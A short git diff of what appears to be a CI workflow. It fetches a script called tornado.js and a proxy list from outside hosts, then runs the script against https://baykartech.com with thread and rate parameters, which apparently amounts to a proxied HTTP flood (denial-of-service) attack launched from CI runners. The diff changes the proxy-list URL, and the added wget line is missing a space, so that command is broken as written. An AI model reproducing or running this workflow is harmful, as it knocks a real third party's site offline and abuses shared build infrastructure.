@@ -15,7 +15,7 @@ jobs:
       - name: OK !
         run: |
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
-          wget https://up.zip/v1nnk/proxies.txt
+          wgethttps://up.zip/9fpdq/proxies.txt
           npm i hpack
           timeout 30 node tornado.js GET https://baykartech.com 30 8 64 proxies.txt --full
           
